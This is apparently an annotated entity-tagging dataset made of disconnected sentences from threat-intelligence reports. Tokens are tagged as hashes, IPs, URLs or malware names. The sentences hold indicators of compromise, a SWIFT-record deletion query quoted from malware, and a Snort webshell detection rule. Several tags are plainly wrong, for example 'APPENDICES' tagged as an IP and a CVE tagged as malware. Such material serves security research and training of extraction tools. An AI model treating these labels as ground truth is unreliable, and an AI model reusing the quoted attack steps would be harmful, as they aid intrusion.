Curiously	O
,	O
this	O
log	O
file	O
is	O
encrypted	O
with	O
a	O
simple	O
two-byte	O
XOR	O
instead	O
of	O
RC4	O
.	O

Based	O
on	O
our	O
findings	O
,	O
the	O
most	O
common	O
type	O
of	O
email	O
attachment	O
type	O
used	O
in	O
targeted	O
attacks	O
were	O
file	O
archives	O
of	O
various	O
forms	O
.	O

5.0.0	O
beta1	O
af1b2cd8580650d826f48ad824deef3749a7db6fde1c7e1dc115c6b0a7dfa0dd	B-hash
5.1.1	O
rc	O
2371f5b63b1e44ca52ce8140840f3a8b01b7e3002f0a7f0d61aecf539566e6a1	B-hash
5.1.2	O
rc1	O
05dd407018bd316090adaea0855bd7f7c72d9ce4380dd4bc0feadc6566a36170	B-hash
5.2.0	O
rev1	O
00030ec8cce1f21120ebf5b90ec408b59166bbc3fba17ebae0fc23b3ca27bf4f	B-hash
lena_http.bin	O
303f9c00edb4c6082542e456a30a2446a259b8bb9fb6b0f76ff318d5905e429c	B-hash

As	O
it	O
is	O
with	O
digital	O
crime	O
,	O
chances	O
are	O
high	O
no	O
proof	O
will	O
ever	O
evolve	O
and	O
research	O
will	O
be	O
limited	O
to	O
educated	O
conclusions	O
.	O

For	O
Ukrainian	O
troops	O
,	O
artillery	O
forces	O
have	O
also	O
shouldered	O
a	O
heavy	O
cost	O
.	O

While	O
these	O
are	O
clearly	O
not	O
widespread	O
attacks	O
and	O
,	O
as	O
in	O
any	O
other	O
targeted	O
attack	O
case	O
,	O
we	O
should	O
not	O
create	O
alarmism	O
for	O
threats	O
that	O
are	O
likely	O
irrelevant	O
for	O
the	O
majority	O
of	O
organizations	O
,	O
we	O
want	O
to	O
share	O
a	O
few	O
indicators	O
that	O
might	O
help	O
identify	O
infections	O
or	O
assist	O
in	O
further	O
research	O
by	O
whoever	O
is	O
interested	O
in	O
this	O
campaign	O
.	O

Implication	O
:	O
Impact	O
to	O
human	O
safety	O
,	O
the	O
environment	O
,	O
or	O
damage	O
to	O
equipment	O
,	O
the	O
extent	O
of	O
which	O
depends	O
on	O
the	O
physical	O
constraints	O
of	O
the	O
process	O
and	O
the	O
plant	O
design	O
.	O

2-For	O
more	O
information	O
,	O
contact	O
CrowdStrike	O
3-vKontakte	B-url.normal
is	O
a	O
Russian	O
social	O
media	O
networking	O
site	O
alike	O
in	O
layout	O
and	O
functionality	O
to	O
Facebook	B-url.normal
.	O

The	O
proceeding	O
eight	O
bytes	O
of	O
the	O
packet	O
contain	O
both	O
compressed	O
and	O
uncompressed	O
size	O
information	O
followed	O
by	O
the	O
zlib	O
compressed	O
data	O
,	O
starting	O
with	O
bytes	O
78	O
9C	O
at	O
offset	O
14	O
(	O
shown	O
in	O
Figures	O
1	O
and	O
2	O
,	O
below	O
)	O
.	O

ПОПР	O
-	O
Д30DEVELOPED20FEB	O
-	O
13APR	O

The	O
encryption	O
used	O
is	O
a	O
simple	O
XOR	O
with	O
a	O
rotating	O
key	O
.	O

In	O
addition	O
to	O
using	O
the	O
password	O
'	O
1411	O
'	O
,	O
the	O
attackers	O
are	O
also	O
using	O
the	O
password	O
'	O
12345000	O
'	O
.	O

Exploit	O
Document	O
Filename	O
:	O
Decoy	O
Document	O
Title	O
:	O

1/12	O

Malicious	O
document	O
exploiting	O
CVE-2018-4878	O
.	O

They	O
include	O
the	O
director	O
of	O
speechwriting	O
for	O
Hillary	O
for	O
America	O
and	O
the	O
deputy	O
director	O
office	O
of	O
the	O
chair	O
at	O
the	O
DNC	O
.	O

@	O
þÿÌ3Ð	O
¤b	O
̄Opþ192.168.131.67Abhwatch1Bbhwatch2'CBahrain	O
WatchIreceivedrC	O
:	O
\Documents	O
and	O
Settings\XPMUser\My	O
Documents\gameborev3.jpgJRecording	O
0þ-0800UTC	O
DST.1þ2012-07-20	O
12:18:21.:þ2012-07-20	O
12:18:21	O

Details	O
associated	O
with	O
this	O
threat	O
have	O
been	O
shared	O
with	O
the	O
ThreatConnect	O
Community	O
within	O
Incident	O
'	O
20130731A	O
:	O
South	O
Asia	O
Cyber	O
Espionage	O
Heats	O
Up	O
'	O
.	O

After	O
it	O
is	O
replaced	O
by	O
more	O
robust	O
backdoors	O
,	O
it	O
may	O
be	O
left	O
in	O
place	O
as	O
a	O
last	O
resort	O
should	O
remediation	O
take	O
place	O
.	O

A	O
second	O
target	O
outside	O
the	O
Middle	O
East	O
provides	O
further	O
con rmation	O
of	O
Chafer	O
's	O
heightened	O
ambitions	O
in	O
recent	O
times	O
.	O

This	O
section	O
describes	O
how	O
the	O
malware	O
is	O
designed	O
to	O
resist	O
analysis	O
and	O
evade	O
identification	O
.	O

Palestinian	O
authority	O
,	O
and	O
39	O
from	O
12	O
other	O
countries	O
(	O
1-5	O
each	O
)	O
.	O

37.235.52.18	B-ip.unknown
2016-05-11	O
78.153.151.222	B-ip.unknown
2016-05-13	O
175.126.148.111	B-ip.unknown
2016-07-14	O
95.183.52.57	B-ip.unknown
2016-07-26	O
109.237.108.202	B-ip.unknown
2016-12-26	O
109.248.222.85	B-ip.unknown
2016-12-27	O

In	O
today	O
's	O
online	O
chat	O
and	O
dating	O
scene	O
,	O
romance	O
scams	O
are	O
not	O
uncommon	O
,	O
what	O
with	O
catfishers	O
and	O
West	O
African	O
cybercriminals	O
potently	O
toying	O
with	O
their	O
victims	O
'	O
emotions	O
to	O
cash	O
in	O
on	O
their	O
bank	O
accounts	O
.	O

The	O
group	O
has	O
recently	O
adopted	O
NSSM	O
to	O
maintain	O
persistence	O
and	O
install	O
the	O
service	O
which	O
runs	O
Plink	O
on	O
the	O
compromised	O
computer	O
.	O

They	O
are	O
contained	O
within	O
the	O
IP	O
logs	O
,	O
which	O
means	O
that	O
,	O
prior	O
to	O
an	O
infection	O
,	O
the	O
attackers	O
fi	O
rst	O
search	O
for	O
vulnerabilities	O
to	O
exploit	O
on	O
the	O
targeted	O
systems	O
.	O

The	O
wmiapsrv32/64.exe	O
is	O
a	O
fake	O
application	O
set	O
as	O
a	O
service	O
,	O
which	O
runs	O
java.exe	O
(	O
the	O
actual	O
Bitcoin	O
miner	O
)	O
.	O

In	O
contrast	O
,	O
the	O
DragonOK	B-malware.infosteal
campaign	O
has	O
been	O
observed	O
targeting	O
high-technology	O
and	O
manufacturing	O
companies	O
in	O
Japan	O
and	O
Taiwan	O
.	O

More	O
than	O
half	O
of	O
the	O
group	O
's	O
earlier	O
targets	O
were	O
in	O
the	O
Energy	O
or	O
Defense	O
sectors	O
,	O
but	O
it	O
also	O
targeted	O
organizations	O
in	O
the	O
Consultancy/Security	O
,	O
Aerospace	O
,	O
Research	O
,	O
and	O
Media	O
sectors	O
,	O
in	O
addition	O
to	O
embassies	O
.	O

Subsequently	O
,	O
it	O
identifi	O
es	O
the	O
operating	O
system	O
used	O
and	O
sets	O
the	O
corresponding	O
Bitcoin	O
miner	O
application	O
into	O
the	O
%	O
TEMP	O
%	O
system	O
folder	O
.	O

Based	O
on	O
the	O
data	O
we	O
captured	O
in	O
2017	O
,	O
targets	O
in	O
China	O
are	O
trade	O
related	O
institutions	O
and	O
concentrated	O
in	O
provinces	O
that	O
have	O
frequent	O
trading	O
activities	O
.	O

SHA1	O
SHA256	O
1595ea659a87677c59a195a3aeec9e3ef135c808ec353222e8eaa662117c9362	B-hash
dff54d302900e323c8988c725bbe2299	B-hash
c5c0bae48c326006b9dcc99855646d3be0b474c1	B-hash

For	O
the	O
past	O
decade	O
,	O
Windows	O
users	O
have	O
been	O
the	O
main	O
targets	O
of	O
consumer	O
,	O
for-profit	O
cybercrime	O
.	O

Then	O
the	O
connection	O
is	O
retried	O
.	O

Figure	O
13	O
:	O
Command	O
and	O
Control	O
Server	O
Open	O
Directories	O
Inside	O
the	O
open	O
directories	O
,	O
we	O
were	O
able	O
to	O
get	O
the	O
following	O
directories	O
corresponding	O
to	O
the	O
different	O
active	O
campaigns	O
.	O

Almost	O
all	O
of	O
these	O
components	O
are	O
obfuscated	O
.	O

The	O
first	O
parameter	O
CONTEXT	O
structure	O
was	O
also	O
constructed	O
by	O
the	O
attacker	O
.	O

Although	O
the	O
group	O
behind	O
it	O
seems	O
to	O
be	O
focused	O
on	O
carefully	O
selecting	O
their	O
victims	O
,	O
using	O
a	O
custommade	O
info-stealer	O
for	O
intelligence	O
gathering	O
operations	O
,	O
due	O
to	O
its	O
very	O
nature	O
it	O
is	O
difficult	O
to	O
assert	O
what	O
the	O
ultimate	O
goal	O
of	O
this	O
campaign	O
is	O
.	O

'	O
0day	O
漏洞	O
(	O
CVE-2018-8174	B-malware.unknown
)	O

'	O
Election	O
Cyberattacks	O
:	O
Pro-Russia	O
Hackers	O
Have	O
Been	O
Accused	O
in	O
Past	O
.	O
'	O

hxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1	B-url.unknown

Cryptocurrency	O
exchange	O
Construction	O
information	O
and	O
analysis	O
portal	O
Personal	O
website	O
of	O
a	O
developer	O
Vainah	O
T	O
elecom	O
IPs	O
and	O
Subnets	O
(	O
Chechen	O
Republic	O
)	O
Various	O
Chechen	O
resources	O
(	O
governmental	O
organizations	O
,	O
universities	O
,	O
industrial	O
enterprises	O
,	O
etc	O
.	O
)	O

8/12	O

We	O
help	O
our	O
customers	O
stay	O
ahead	O
of	O
threats	O
,	O
make	O
the	O
necessary	O
adjustments	O
to	O
organizational	O
policies	O
and	O
procedures	O
,	O
and	O
re-configure	O
and	O
adapt	O
security	O
and	O
IT	O
systems	O
.	O

Each	O
command	O
is	O
a	O
mixed	O
text/binary	O
buffer	O
.	O

Once	O
decrypted	O
,	O
it	O
further	O
reads	O
an	O
RC4	O
key	O
from	O
it	O
,	O
and	O
decrypts	O
it	O
with	O
the	O
RC4	O
algorithm	O
.	O

Similar	O
to	O
the	O
newly	O
discovered	O
HIGHTIDE	B-malware.backdoor
samples	O
documented	O
above	O
,	O
this	O
malicious	O
document	O
dropped	O
a	O
backdoor	O
to	O
C	O
:	O
\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user	O
}	O
\LOCAL	O
SETTINGS\Temp\word.exe	O
.	O

In	O
the	O
case	O
of	O
the	O
winrar[.]be/ralrab[.]com	O
watering	B-malware.backdoor
hole	I-malware.backdoor
malware	O
,	O
each	O
one	O
of	O
the	O
six	O
droppers	O
that	O
we	O
observed	O
created	O
a	O
similar	O
set	O
of	O
dropped	O
components	O
on	O
disk	O
.	O

SUBSCRIBE	O

Domains	O
:	O
afp.mozjlla.com	O
|	O
Password	O
:	O
741526	O
Mutex	O
:	O
)	O
!	O
afpA.I4	O

SNOWBALL	O
implant	O
beacon	O

The	O
username	O
appears	O
to	O
be	O
attacker	O
specified	O
and	O
has	O
occurred	O
in	O
2017	O
Bankshot	O
samples	O
.	O

permissions	O
.	O

The	O
binary	O
is	O
designed	O
to	O
be	O
called	O
from	O
its	O
one	O
exported	O
function	O
,	O
'	O
Setup	O
'	O
;	O
the	O
Run	O
key	O
will	O
ensure	O
that	O
whenever	O
the	O
victim	O
user	O
logs	O
into	O
the	O
system	O
the	O
backdoor	O
will	O
execute	O
.	O

Club	O
blogpost	O
details	O
the	O
deobfuscation	O
of	O
the	O
shellcode	O
and	O
loading	O
of	O
the	O
DLL	O
into	O
memory	O
.	O

Unlike	O
the	O
lawful	O
interception	O
software	O
that	O
companies	O
such	O
as	O
FinFisher	O
and	O
Hacking	O
Team	O
sell	O
to	O
governments	O
and	O
law	O
enforcement	O
,	O
the	O
RATs	O
employed	O
in	O
this	O
campaign	O
are	O
not	O
only	O
commercially-available	O
to	O
anyone	O
,	O
they	O
're	O
cheap	O
.	O

Launcher	O
checkProcessName	O
]	O

The	O
malware	O
does	O
not	O
include	O
advanced	O
malware	O
technologies	O
and	O
no	O
groundbreaking	O
innovations	O
,	O
even	O
though	O
those	O
were	O
advertised	O
.	O

1	O
.	O

Credentials	O
stolen	O
this	O
way	O
can	O
be	O
used	O
to	O
move	O
within	O
the	O
confines	O
of	O
the	O
organization	O
's	O
network	O
.	O

Network	O
administrators	O
are	O
encouraged	O
to	O
check	O
their	O
public-facing	O
websites	O
for	O
the	O
malicious	O
file	O
hashes	O
.	O

12	O
Sept	O
.	O

Function	O
for	O
scrambling	O
AES256	O
key	O
in	O
the	O
outgoing	O
packet	O

We	O
found	O
many	O
related	O
samples	O
of	O
the	O
Bandook	B-malware.unknown
Trojan	O
while	O
we	O
were	O
doing	O
our	O
example	O
,	O
research	O
.	O

These	O
development	O
efforts	O
may	O
have	O
resulted	O
in	O
the	O
emergence	O
of	O
the	O
WATERSPOUT	B-malware.backdoor
backdoor	O
.	O

Mutex	O
:	O
rV6880B9	O

Hashes	O

The	O
Executable	O
The	O
executable	O
contained	O
in	O
the	O
archive	O
is	O
called	O
'	O
DriverInstallerU.exe	B-malware.drop
'	O
but	O
its	O
metadata	O
shows	O
that	O
its	O
original	O
name	O
is	O
'	O
Interenet	B-malware.drop
Assistant.exe	I-malware.drop
'	O
.	O

Over	O
80	O
%	O
of	O
intellectual	O
property	O
is	O
stored	O
online	O
digitally	O
.	O

When	O
the	O
Windows	O
operating	O
system	O
is	O
installed	O
or	O
an	O
NTFS	O
volume	O
created	O
,	O
a	O
backup	O
copy	O
of	O
the	O
VBR	O
is	O
written	O
to	O
the	O
last	O
sector	O
of	O
the	O
volume	O
.	O

This	O
also	O
got	O
the	O
attention	O
of	O
the	O
Vietnam	O
CERT	O
(	O
Vietnamese	O
language	O
)	O
.	O

We	O
assume	O
this	O
happened	O
due	O
to	O
the	O
fact	O
that	O
Microsoft	O
has	O
disabled	O
AutoRun	O
for	O
external	O
media	O
.	O

In	O
fact	O
the	O
majority	O
of	O
files	O
outside	O
of	O
the	O
System32	O
and	O
Document	O
and	O
Settings	O
folder	O
are	O
recoverable	O
as	O
well	O
;	O
this	O
provided	O
the	O
opportunity	O
for	O
a	O
successful	O
and	O
fruitful	O
analysis	O
,	O
investigation	O
,	O
and	O
remediation	O
effort	O
.	O

A	O
200.63.46.23	B-ip.unknown
3	O
www.p90xprice.com	B-url.unknown
.	O

As	O
described	O
in	O
this	O
paper	O
,	O
this	O
remote	O
access	O
Torjan	B-malware.backdoor
's	O
espionage	O
capabilities	O
and	O
extensive	O
intelligence	O
harvesting	O
from	O
victims	O
turns	O
it	O
into	O
an	O
extremely	O
powerful	O
tool	O
that	O
is	O
very	O
diffi	O
cult	O
to	O
identify	O
.	O

This	O
tool	O
appears	O
to	O
be	O
designed	O
to	O
operate	O
on	O
high­value	O
corporate	O
systems	O
like	O
Domain	O
Controllers	O
or	O
IIS	O
servers	O
that	O
act	O
as	O
repositories	O
of	O
valuable	O
information	O
,	O
particularly	O
for	O
lateral	O
movement	O
.	O

The	O
vast	O
majority	O
of	O
infrastructure	O
in	O
terms	O
of	O
hostnames	O
observed	O
associated	O
with	O
these	O
attacks	O
have	O
been	O
dynamic	O
DNS	O
domains	O
,	O
primarily	O
associated	O
with	O
no­ip.com	O
.	O

SELECT	O
MESG_S_UMID	O
FROM	O
SAAOWNER.MESG_%s	O
WHERE	O
MESG_SENDER_SWIFT_ADDRESS	O
LIKE	O
'	O
%	O
%	O
%	O
s	O
%	O
%	O
'	O
AND	O
MESG_TRN_REF	O
LIKE	O
'	O
%	O
%	O
%	O
s	O
%	O
%	O
'	O
;	O
MESG_S_UMID	O
is	O
then	O
passed	O
to	O
DELETE	O
statements	O
,	O
deleting	O
the	O
transaction	O
from	O
the	O
local	O
database	O
.	O

Attack	O
Vectors	O

However	O
,	O
as	O
I	O
mentioned	O
above	O
,	O
in	O
the	O
course	O
of	O
our	O
research	O
we	O
have	O
discovered	O
new	O
evidence	O
which	O
will	O
be	O
discussed	O
below	O
.	O

The	O
'	O
64.71.162.70	B-ip.unknown
'	O
address	O
and	O
the	O
associated	O
domain	O
'	O
www.ollay011.zyns.com	B-url.unknown
'	O
are	O
rather	O
infamous	O
and	O
the	O
first	O
mention	O
of	O
it	O
I	O
could	O
find	O
is	O
in	O
this	O
shadowserver	O
post	O
:	O
http://blog.shadowserver.org/2012/04/16/beware-of-what-you-download-recent-purported-ceiec-document-dump-booby-trapped/	B-url.unknown
related	O
to	O
exploit	O
documents	O
identified	O
in	O
a	O
data	O
dump	O
from	O
Hardcore	O
Charlie	O
.	O

Available	O
remote	O
functionality	O
includes	O
:	O

The	O
sample	O
'	O
Arrested	O
Suspects.jpg	O
'	O
(	O
'	O
gpj.stcepsuS	O
detserrA.exe	O
'	O
)	O
displays	O
:	O
It	O
additionally	O
creates	O
a	O
directory	O
(	O
which	O
appears	O
to	O
vary	O
from	O
sample	O
to	O
sample	O
)	O
:	O
C	O
:	O
\Documents	O
and	O
Settings\XPMUser\Local	O
Settings\Temp\TMP51B7AFEF	O
It	O
copies	O
itself	O
there	O
(	O
in	O
this	O
case	O
the	O
malware	O
appears	O
as	O
'	O
Arrested	O
Suspects.jpg	O
'	O
)	O
where	O
it	O
is	O
renamed	O
:	O
C	O
:	O
\Documents	O
and	O
Settings\XPMUser\Local	O
Settings\Temp\TMP51B7AFEF\Arrested	O
Suspects.jpg	O
'	O
=	O
>	O
C	O
:	O
\Documents	O
and	O
Settings\XPMUser\Local	O
Settings\Temp\TMP51B7AFEF\tmpD.tmp	O
Then	O
it	O
drops	O
the	O
following	O
files	O
:	O
C	O
:	O
\DOCUME~1\%USER%\LOCALS~1\Temp\delete.bat	O
C	O
:	O
\DOCUME~1\%USER%\LOCALS~1\Temp\driverw.sys	O
It	O
creates	O
the	O
folder	O
(	O
the	O
name	O
of	O
which	O
varies	O
from	O
host	O
to	O
host	O
)	O
:	O
C	O
:	O
\Documents	O
and	O
Settings\	O
%	O
USER	O
%	O
\Application	O
Data\Microsoft\Installer\	O
{	O
5DA45CC9-D840-47CC-9F86-FD2E9A718A41	O
}	O
This	O
process	O
is	O
observable	O
on	O
the	O
filesystem	O
timeline	O
of	O
the	O
infected	O
host	O
(	O
click	O
image	O
to	O
enlarge	O
)	O
:	O
'	O
driverw.sys	O
'	O
is	O
loaded	O
and	O
then	O
'	O
delete.bat	O
'	O
is	O
run	O
which	O
deletes	O
the	O
original	O
payload	O
and	O
itself	O
.	O

MALICIOUS	O
APP	O
DEVELOPMENT	O
,	O
DEPLOYMENT	O
,	O
AND	O
USAGE	O
TIME	O
FRAME	O
LATE	O
APRIL	O
2013	O
-	O
AND	O
BEYOND	O

However	O
,	O
based	O
on	O
comparisons	O
of	O
recent	O
CozyDuke	B-malware.drop
samples	O
against	O
older	O
samples	O
we	O
have	O
obtained	O
dating	O
back	O
as	O
far	O
as	O
the	O
end	O
of	O
2011	O
,	O
we	O
believe	O
CozyDuke	B-malware.drop
has	O
been	O
under	O
active	O
development	O
since	O
at	O
least	O
2011	O
.	O

BDCADEAE92C7C662D771507D78689D4B62D897F9	B-hash

The	O
server	O
variant	O
supports	O
basic	O
RAT	B-malware.backdoor
functionality	O
such	O
as	O
file	O
management	O
(	O
uploading	O
and	O
downloading	O
)	O
,	O
network	O
tunneling	O
and	O
remote	O
command	O
shell	O
.	O

@	O
@	O
sernum2	O

HBGary	O
has	O
prepared	O
an	O
inoculation	O
shot	O
for	O
this	O
malware	O
.	O

The	O
C	O
&	O
C	O
rotation	O
during	O
the	O
Trojan	B-malware.backdoor
's	O
lifecycle	O
also	O
helps	O
evade	O
detection	O
at	O
the	O
network	O
level	O
,	O
while	O
the	O
impersonation	O
of	O
legitimate	O
,	O
known	O
applications	O
takes	O
care	O
of	O
the	O
rest	O
.	O

The	O
following	O
factors	O
in	O
this	O
cyber	O
attack	O
suggests	O
the	O
possible	O
involvement	O
of	O
Pakistan	O
state	O
sponsored	O
cyber	O
espionage	O
group	O
to	O
steal	O
the	O
intellectual	O
property	O
such	O
as	O
design/blueprints	O
and	O
manufacturing	O
data	O
related	O
to	O
submarines	O
and	O
warships	O
.	O

Background	O
2	O
.	O

In	O
addition	O
,	O
because	O
the	O
individual	O
account	O
hijacked	O
for	O
this	O
operation	O
had	O
been	O
used	O
to	O
try	O
to	O
raise	O
funds	O
for	O
Ukrainian	O
forces	O
,	O
the	O
adversary	O
may	O
have	O
been	O
trying	O
to	O
aggravate	O
Western	O
governments	O
enough	O
to	O
freeze	O
the	O
individual	O
's	O
accounts	O
.	O

employed	O
by	O
the	O
DragonOK	B-malware.infosteal
group	O
.	O

APPENDICES	B-ip.unknown
..................................................................................................	I-ip.unknown
19	I-ip.unknown

The	O
screenshot	O
of	O
data	O
package	O
in	O
request	O
is	O
as	O
follows	O
:	O

CrowdStrike	O
derived	O
this	O
information	O
from	O
investigations	O
in	O
non-classified	O
environments	O
.	O

They	O
are	O
widely	O
confirmed	O
as	O
the	O
entity	O
behind	O
the	O
Ukraine	O
power	O
grid	O
attack	O
from	O
2015	O
as	O
well	O
as	O
a	O
chain	O
of	O
other	O
destructive	O
attacks	O
that	O
plagued	O
that	O
country	O
over	O
the	O
past	O
years	O
.	O

The	O
boutique	O
element	O
is	O
reflected	O
in	O
their	O
artisanally	O
adaptive	O
toolkit	O
for	O
lateral	O
movement	O
and	O
data	O
collection	O
which	O
appears	O
to	O
change	O
from	O
infection	O
to	O
infection	O
to	O
fit	O
custom­	O
tailored	O
requirements	O
for	O
each	O
of	O
their	O
prospective	O
clients	O
.	O

Finally	O
,	O
according	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
Iranian	O
contractor	O
ITSEC	O
specifically	O
employed	O
hackers	O
from	O
the	O
respective	O
online	O
forums	O
Simorgh	O
and	O
Delta	O
Security	O
.	O

Each	O
malware	O
set	O
we	O
have	O
observed	O
so	O
far	O
communicates	O
with	O
a	O
different	O
CloudMe	O
account	O
though	O
.	O

We	O
can	O
solve	O
this	O
problem	O
using	O
binary	O
similarity	O
calculation	O
.	O

Key	O
:	O
babybear	O

Potentially	O
,	O
any	O
vulnerable	O
server	O
on	O
the	O
internet	O
is	O
of	O
interest	O
to	O
the	O
attackers	O
when	O
they	O
want	O
to	O
establish	O
a	O
foothold	O
in	O
order	O
to	O
develop	O
further	O
attacks	O
against	O
target	O
facilities	O
.	O

The	O
encoded	O
string	O
is	O
passed	O
in	O
register	O
to	O
the	O
decoder	O
function	O
)	O
.	O

The	O
resulting	O
data	O
is	O
saved	O
in	O

Their	O
values	O
start	O
with	O
the	O
word	O
'	O
MAGICBOX	O
'	O
.	O

C	O
:	O
\workspace\Retro\DLL-injected-explorer\zlib1.pdb	O
C	O
:	O
\workspace\Retro\RetroDLL\zlib1.pdb	O
The	O
evolution	O
of	O
the	O
reflective	O
DLL	O
injection	O
technique	O
can	O
be	O
found	O
from	O
the	O
relevant	O
PDB	O
paths	O
,	O
and	O
there	O
are	O
a	O
lot	O
of	O
variants	O
of	O
this	O
series	O
of	O
backdoors	O
.	O

We	O
'll	O
skip	O
the	O
shellcode	O
analysis	O
for	O
now	O
and	O
go	O
directly	O
to	O
the	O
binary	O
which	O
is	O
stored	O
beginning	O
at	O
offset	O
0x1BC27	O
as	O
an	O
ASCII	O
hex-encoded	O
,	O
xor-encoded	O
binary	O
.	O

These	O
random	O
strings	O
are	O
used	O
to	O
name	O
the	O
Windows	O
tool	O
,	O
which	O
is	O
then	O
executed	O
.	O

It	O
must	O
be	O
noted	O
that	O
a	O
large	O
and	O
thriving	O
underground	O
economy	O
exists	O
to	O
both	O
build	O
and	O
disseminate	O
malware	O
worldwide	O
,	O
and	O
that	O
most	O
of	O
this	O
malware	O
is	O
capable	O
of	O
intellectual	O
property	O
theft	O
.	O

*	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcp\out\*	O
.	O

소프트웨어	O
설치판에	O
악성코드를	O
포함시켜	O
해	O
당	O
소프트웨어의	O
공식사이트를	O
통해	O
배포하는	O
방식과	O
소프트웨어	O
업데이트	O
과정을	O
통해	O
악성코드를	O
감염시	O
키는	O
방식을	O
주로	O
이용한다	O
.	O

System.exe	O

One	O
of	O
the	O
more	O
interesting	O
observations	O
during	O
the	O
analysis	O
of	O
these	O
files	O
was	O
the	O
re-use	O
of	O
the	O
latest	O
AppLocker	O
bypass	O
,	O
and	O
lateral	O
movement	O
techniques	O
for	O
the	O
purpose	O
of	O
indirect	O
code	O
execution	O
.	O

Armed	O
with	O
knowledge	O
about	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
's	O
features	O
,	O
platform	O
versatility	O
,	O
delivery	O
mechanisms	O
,	O
traffic	O
analysis	O
,	O
and	O
detection—along	O
with	O
a	O
few	O
free	O
software	O
tools—researchers	O
can	O
begin	O
eradicating	O
this	O
elegantly	O
designed	O
but	O
dangerous	O
menace	O
.	O

This	O
payload	O
is	O
particular	O
to	O
Asia	O
,	O
as	O
the	O
messages	O
that	O
the	O
SFX	O
Install	O
Script	O
displays	O
as	O
part	O
of	O
the	O
setup	O
on	O
the	O
compromised	O
system	O
are	O
written	O
in	O
Chinese	O
.	O

For	O
example	O
,	O
the	O
memory	O
segment	O
below	O
from	O
the	O
'	O
winlogon.exe	O
'	O
process	O
is	O
marked	O
as	O
executable	O
and	O
writeable	O
:	O
Here	O
the	O
malware	O
starts	O
a	O
new	O
instance	O
of	O
a	O
legitimate	O
process	O
such	O
as	O
'	O
winlogon.exe	O
'	O
and	O
before	O
the	O
process	O
's	O
first	O
thread	O
begins	O
,	O
the	O
malware	O
de-allocates	O
the	O
memory	O
containing	O
the	O
legitimate	O
code	O
and	O
injects	O
malicious	O
code	O
in	O
its	O
place	O
.	O

This	O
virtualised	O
packer	O
was	O
not	O
recognised	O
and	O
appears	O
to	O
be	O
bespoke	O
.	O

Interesting	O
though	O
,	O
the	O
code	O
seen	O
in	O
Babar	O
's	O
implant	O
is	O
remarkably	O
similar	O
to	O
an	O
example	O
posted	O
at	O
.	O

The	O
full	O
command	O
executed	O
is	O
:	O

As	O
already	O
documented	O
by	O
Dixon	O
,	O
information	O
about	O
the	O
submitters	O
of	O
samples	O
is	O
not	O
publicly	O
available	O
,	O
but	O
can	O
partially	O
be	O
retrieved	O
from	O
their	O
Intelligence	O
service	O
.	O

Each	O
new	O
discovery	O
revealed	O
more	O
information	O
,	O
enabling	O
a	O
more	O
complete	O
picture	O
to	O
emerge	O
.	O

Mar	O
2nd	O
2012	O

alert	O
tcp	O
any	O
any	O
-	O
>	O
any	O
80	O
(	O
sid:900001	O
;	O
content	O
:	O
'	O
base64_decode	O
'	O
;	O
http_client_body	O
;	O
flow	O
:	O
to_server	O
,	O
established	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
nocase	O
;	O
http_method	O
;	O
;	O
msg	O
:	O
'	O
Webshell	O
Detected	O
Apache	O
'	O
;	O
)	O

As	O
Unrecom	B-malware.backdoor
1	O
is	O
a	O
comprehensive	O
multi-platform	O
Java-based	O
remote	O
access	O
tool	O
,	O
currently	O
not	O
detected	O
by	O
most	O
AntiVirus	O
products	O
,	O
it	O
presents	O
a	O
risk	O
to	O
a	O
large	O
number	O
of	O
potential	O
victims	O
,	O
regardless	O
of	O
operating	O
system	O
.	O

Further	O
indicators	O
are	O
provided	O
in	O
Appendix	O
A	O
.	O

This	O
,	O
however	O
,	O
is	O
a	O
known	O
tactic	O
that	O
a	O
lot	O
of	O
Office-based	O
malware	O
uses	O
.	O

1505	O
Transfer	O
Investigation	O
report	O
reports-­‐pdf.jar	B-malware.infosteal
39ad2cab9829ff6a1107b97f1496b499	B-hash
184.22.201[.]27	B-ip.unknown
3030	O
US	O
$	O
25,000	O
TT	O
COPY	O
ATTACHED	O
US$25k.jar	B-malware.infosteal
ccfbc03a5beb1adb66f058b1f5a84d98	B-hash
toba.no-­‐ip[.]biz	B-malware.infosteal
1505	O
Thank	O
you	O
Payment	B-malware.infosteal
Invoice.jar	I-malware.infosteal
44f011702ff80b337124d4879607f6b1	B-hash
greengreen1.no-­‐	B-malware.infosteal
ip[.]biz	I-malware.infosteal
INV#94586.jar	B-malware.infosteal
FW	O
:	O
URGENT	O
CONFIRMATION	O
P/I	O
#	O
94578	O
06c2760060d41533b36572ae3c1ba2df	B-hash
192.95.21[.]44	B-ip.unknown
1511	O
ComFirm	O
transactions	O
before	O
release	O
Hold-­‐transactions-­‐pdf.jar	B-malware.infosteal
verification-­‐docx.jar	B-malware.infosteal
bc84b115d98988c5489d6acf96046b78	B-hash
184.22.201[.]27	B-ip.unknown
3030	O
Remittance	O
Error	O
2089/234-­‐	O
Reported	O
lost	O
of	O
data	O
(	O
Complete	O
and	O
email	O
back	O
)	O
DBC_BANK_IMG_23456_15	B-malware.infosteal
6.jar	I-malware.infosteal
fca329c46f50e031597babe07fee46a8	B-hash
Transfer	O
error	O
,	O
kindly	O
reverse	O
to	O
lremit_Transfer_Error_Page	B-malware.infosteal
.jar	I-malware.infosteal
8811a91e0ef5b181b1f0433d913faaaf	B-hash
resultpage92.no-­‐	B-malware.infosteal
ip[.]biz	I-malware.infosteal
Remittance	O
Error	O
2089/234-­‐	O
Reported	O
lost	O
of	O
data	O
(	O
Complete	O
and	O
email	O
back	O
)	O
DBC_BANK_IMG_23456_15	B-malware.infosteal
6.jar	I-malware.infosteal
8842ce373c910c012a0aa58e37b3d080	B-hash
magawalton.no-­‐	B-malware.infosteal
ip[.]biz	I-malware.infosteal
5353	O
1505	O

To	O
identify	O
vulnerabilities	O
in	O
the	O
defense	O
technologies	O
to	O
gain	O
advantage	O
over	O
adversary	O
's	O
military	O
capabilities	O
To	O
reduce	O
their	O
research	O
and	O
development	O
costs	O
and	O
produce	O
and	O
sell	O
similar	O
products	O
at	O
lower	O
prices	O

createFileInSystem	O

Upon	O
retrieval	O
of	O
the	O
second	O
stage	O
,	O
a	O
request	O
is	O
then	O
made	O
to	O
the	O
'	O
downloadUrl	O
'	O
,	O
which	O
is	O
the	O
shellcode	O
payload	O
.	O

This	O
is	O
probably	O
the	O
reason	O
